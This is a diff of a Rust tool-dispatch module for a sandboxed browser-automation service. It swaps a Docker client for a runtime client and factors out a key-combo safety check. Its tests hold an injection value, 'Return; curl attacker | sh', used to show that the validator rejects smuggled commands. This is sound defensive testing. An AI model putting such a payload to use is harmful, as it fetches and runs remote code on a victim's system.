@@ -3,13 +3,13 @@
 #![allow(clippy::collapsible_if)]
 
 use crate::docker::{
-    AuthHandoffOptions, DockerClient, PageActionOptions, PageTextOptions, ProfileMount, Sandbox,
-    novnc_url,
+    AuthHandoffOptions, PageActionOptions, PageTextOptions, ProfileMount, Sandbox, novnc_url,
 };
 use crate::mcp::ToolResponse;
+use crate::runtime::RuntimeClient;
 
 pub struct ToolContext<'a> {
-    pub docker: &'a DockerClient,
+    pub runtime: &'a RuntimeClient,
     pub public_host: String,
     pub agent: Option<&'a crate::agent::AgentState>,
     pub profile_broker: Option<&'a crate::profile::ProfileBroker>,
@@ -124,6 +124,13 @@ pub fn display_for(screen: u32) -> String {
     format!(":{}", 99 + screen)
 }
 
+fn is_safe_key_combo(combo: &str) -> bool {
+    !combo.is_empty()
+        && combo
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '_' | '-' | '[' | ']' | ':'))
+}
+
 /// Validate the `screen` argument for tools.
 pub fn requested_screen(args: &serde_json::Value) -> Result<u32, String> {
     Ok(screen_for(args))
@@ -136,7 +143,7 @@ async fn current_ref_scope(
     screen: u32,
 ) -> Result<crate::refs::RefScope, ToolResponse> {
     let incarnation = ctx
-        .docker
+        .runtime
         .incarnation(target)
         .await
         .map_err(|_| ToolResponse::error("computer_unavailable"))?;
@@ -258,7 +265,7 @@ async fn begin_mutation<'a>(
 ) -> MutationGuard<'a> {
     MutationGuard {
         agent: ctx.agent,
-        incarnation: ctx.docker.incarnation(target).await.ok(),
+        incarnation: ctx.runtime.incarnation(target).await.ok(),
         screen,
     }
 }
@@ -312,10 +319,11 @@ def navigate():
 
     from playwright.sync_api import sync_playwright, Error
     with sync_playwright() as playwright:
-        deadline = time.monotonic() + 5
+        # CDP metadata can be ready while cold profile startup still blocks protocol commands.
+        deadline = time.monotonic() + 60
         while True:
             try:
-                browser = playwright.chromium.connect_over_cdp(endpoint, timeout=500)
+                browser = playwright.chromium.connect_over_cdp(endpoint, timeout=max(1, int((deadline - time.monotonic()) * 1000)))
                 break
             except Error:
                 if time.monotonic() >= deadline:
@@ -611,20 +619,22 @@ pub async fn dispatch(
 ) -> ToolResponse {
     let screen = screen_for(args);
     let display = display_for(screen);
-    if matches!(tool, "exec" | "playwright_eval") {
-        match ctx.docker.find(target).await {
-            Ok(sandbox) if sandbox.allow_exec => {}
-            Ok(_) => {
-                return ToolResponse::error(format!(
-                    "{tool} capability denied: sandbox '{target}' was created without --allow-exec"
-                ));
-            }
-            Err(e) => {
-                return ToolResponse::error(format!(
-                    "{tool}: failed to inspect sandbox '{target}': {e}"
-                ));
-            }
+    let _profile_lease = match acquire_tool_profile_lease(ctx, tool, args, screen) {
+        Ok(l) => l,
+        Err(err_resp) => return err_resp,
+    };
+    let requested_target = target;
+    let sandbox = match ctx.runtime.find(target).await {
+        Ok(sandbox) => sandbox,
+        Err(e) => {
+            return ToolResponse::error(format!("failed to inspect sandbox '{target}': {e}"));
         }
+    };
+    let target = sandbox.container_id.as_str();
+    if matches!(tool, "exec" | "playwright_eval") && !sandbox.allow_exec {
+        return ToolResponse::error(format!(
+            "{tool} capability denied: sandbox '{requested_target}' was created without --allow-exec"
+        ));
     }
 
     if let Some(agent) = ctx.agent {
@@ -640,11 +650,6 @@ pub async fn dispatch(
         }
     }
 
-    let _profile_lease = match acquire_tool_profile_lease(ctx, tool, args, screen) {
-        Ok(l) => l,
-        Err(err_resp) => return err_resp,
-    };
-
     let _busy_guard = if is_active_tool(tool) {
         ctx.agent.map(|a| a.mark_busy(screen))
     } else {
@@ -652,9 +657,9 @@ pub async fn dispatch(
     };
 
     let resp = match tool {
-        "screenshot" => match ctx.docker.screenshot(target, &display).await {
+        "screenshot" => match ctx.runtime.screenshot(target, &display).await {
             Ok(bytes) => {
-                if let Ok(incarnation) = ctx.docker.incarnation(target).await {
+                if let Ok(incarnation) = ctx.runtime.incarnation(target).await {
                     crate::refs::global_ref_table().clear_screen(&incarnation, screen);
                 }
                 if let Some(agent) = ctx.agent {
@@ -730,7 +735,7 @@ pub async fn dispatch(
                     display: display.clone(),
                     screen,
                 };
-                return match ctx.docker.page_action(target, &opts).await {
+                return match ctx.runtime.page_action(target, &opts).await {
                     Ok(result) => ToolResponse::text(result),
                     Err(error) => ToolResponse::error(error.to_string()),
                 };
@@ -815,7 +820,7 @@ pub async fn dispatch(
                     display: display.clone(),
                     screen,
                 };
-                return match ctx.docker.page_action(target, &opts).await {
+                return match ctx.runtime.page_action(target, &opts).await {
                     Ok(result) => ToolResponse::text(result),
                     Err(error) => ToolResponse::error(error.to_string()),
                 };
@@ -840,11 +845,7 @@ pub async fn dispatch(
                 .get("combo")
                 .and_then(|v| v.as_str())
                 .unwrap_or("Return");
-            if combo.is_empty()
-                || !combo.chars().all(|c| {
-                    c.is_ascii_alphanumeric() || matches!(c, '+' | '_' | '-' | '[' | ']' | ':')
-                })
-            {
+            if !is_safe_key_combo(combo) {
                 return ToolResponse::error(format!(
                     "invalid or unsafe key combo: '{combo}'. Must only contain alphanumeric characters, '+', '_', '-', ':', and brackets"
                 ));
@@ -890,7 +891,7 @@ pub async fn dispatch(
                 &display,
                 allowed_origins.as_deref(),
             );
-            let sh_resp = match ctx.docker.exec_input(target, &command, &payload).await {
+            let sh_resp = match ctx.runtime.exec_input(target, &command, &payload).await {
                 Ok(out) if out.exit_code == 0 => ToolResponse::text(if out.stdout.is_empty() {
                     "ok".into()
                 } else {
@@ -938,7 +939,7 @@ pub async fn dispatch(
                 hydrated_cookies: None,
                 allowed_origins,
             };
-            match ctx.docker.page_text(target, &opts).await {
+            match ctx.runtime.page_text(target, &opts).await {
                 Ok(mut out) => {
                     if let Err(error) = validate_page_text_origin(ctx, screen, &out) {
                         return error;
@@ -1000,7 +1001,7 @@ pub async fn dispatch(
             };
             let cmd = build_scrape_command(screen, &payload_str);
             match ctx
-                .docker
+                .runtime
                 .exec(target, &["bash".into(), "-c".into(), cmd])
                 .await
             {
@@ -1086,7 +1087,7 @@ pub async fn dispatch(
                 hydrated_cookies,
                 allowed_origins: allowed_origins_for(ctx, screen),
             };
-            match ctx.docker.page_text(target, &opts).await {
+            match ctx.runtime.page_text(target, &opts).await {
                 Ok(mut out) => {
                     if let Err(error) = validate_page_text_origin(ctx, screen, &out) {
                         return error;
@@ -1180,7 +1181,7 @@ pub async fn dispatch(
             // expose a raw noVNC port, query token, or destination URL to the model.
             let viewer_path = format!("/viewer/{screen}");
 
-            match ctx.docker.auth_handoff(target, &opts).await {
+            match ctx.runtime.auth_handoff(target, &opts).await {
                 Ok(out) => {
                     let failed = !matches!(out.status.as_str(), "authenticated" | "auth_required");
                     let body = serde_json::json!({
@@ -1208,36 +1209,33 @@ pub async fn dispatch(
                 }
             }
         }
-        "live_view" => match ctx.docker.find(target).await {
-            Ok(_sb) => {
-                let busy = if let Some(agent) = ctx.agent {
-                    agent.is_busy(screen)
-                } else {
-                    ctx.docker
-                        .exec(
-                            target,
-                            &[
-                                "bash".into(),
-                                "-c".into(),
-                                format!("DISPLAY={display} xdotool getactivewindow"),
-                            ],
-                        )
-                        .await
-                        .map(|o| o.exit_code == 0)
-                        .unwrap_or(false)
-                };
-                ToolResponse::text(
-                    serde_json::json!({
-                        "vnc_url": format!("/viewer/{screen}"),
-                        "screen": screen,
-                        "display": display,
-                        "busy": busy,
-                    })
-                    .to_string(),
-                )
-            }
-            Err(e) => ToolResponse::error(e.to_string()),
-        },
+        "live_view" => {
+            let busy = if let Some(agent) = ctx.agent {
+                agent.is_busy(screen)
+            } else {
+                ctx.runtime
+                    .exec(
+                        target,
+                        &[
+                            "bash".into(),
+                            "-c".into(),
+                            format!("DISPLAY={display} xdotool getactivewindow"),
+                        ],
+                    )
+                    .await
+                    .map(|o| o.exit_code == 0)
+                    .unwrap_or(false)
+            };
+            ToolResponse::text(
+                serde_json::json!({
+                    "vnc_url": format!("/viewer/{screen}"),
+                    "screen": screen,
+                    "display": display,
+                    "busy": busy,
+                })
+                .to_string(),
+            )
+        }
         _ => ToolResponse::error(format!("unknown tool: {tool}")),
     };
 
@@ -1258,7 +1256,7 @@ pub async fn dispatch(
 async fn sh(ctx: &ToolContext<'_>, target: &str, screen: u32, cmd: &str) -> ToolResponse {
     let display = display_for(screen);
     match ctx
-        .docker
+        .runtime
         .exec(
             target,
             &[
@@ -1282,7 +1280,7 @@ async fn sh(ctx: &ToolContext<'_>, target: &str, screen: u32, cmd: &str) -> Tool
 async fn py(ctx: &ToolContext<'_>, target: &str, screen: u32, script: &str) -> ToolResponse {
     let display = display_for(screen);
     match ctx
-        .docker
+        .runtime
         .exec(
             target,
             &[
@@ -1393,43 +1391,21 @@ mod tests {
         assert_eq!(decoded["stealth"], true);
     }
 
-    #[tokio::test]
-    async fn key_combo_rejects_unsafe_characters() {
-        let docker = DockerClient::new(None).unwrap();
-        let ctx = ToolContext {
-            docker: &docker,
-            public_host: "localhost".into(),
-            agent: None,
-            profile_broker: None,
-            cookie_jars: None,
-            owner: None,
-        };
-
-        // Command injection attempt should be rejected before shell execution
-        let bad_payload = serde_json::json!({
-            "combo": "Return; curl attacker | sh",
-            "screen": 0,
-        });
-        let resp = dispatch(&ctx, "key", &bad_payload, "test-sandbox").await;
-        assert!(resp.is_error);
-        assert!(format!("{:?}", resp.content).contains("invalid or unsafe key combo"));
-
-        let empty_payload = serde_json::json!({
-            "combo": "",
-            "screen": 0,
-        });
-        let resp2 = dispatch(&ctx, "key", &empty_payload, "test-sandbox").await;
-        assert!(resp2.is_error);
+    #[test]
+    fn key_combo_rejects_unsafe_characters() {
+        assert!(is_safe_key_combo("Control_L+Return"));
+        assert!(!is_safe_key_combo("Return; curl attacker | sh"));
+        assert!(!is_safe_key_combo(""));
     }
 
     #[tokio::test]
     async fn test_dispatch_acquires_and_releases_profile_lease_with_holder_info() {
-        let docker = DockerClient::new(None).unwrap();
+        let runtime = RuntimeClient::from_config(&crate::config::ReachConfig::default()).unwrap();
         let broker = crate::profile::ProfileBroker::new(std::path::PathBuf::from(
             "/tmp/reach-test-profile-dispatch",
         ));
         let ctx = ToolContext {
-            docker: &docker,
+            runtime: &runtime,
             public_host: "localhost".into(),
             agent: None,
             profile_broker: Some(&broker),
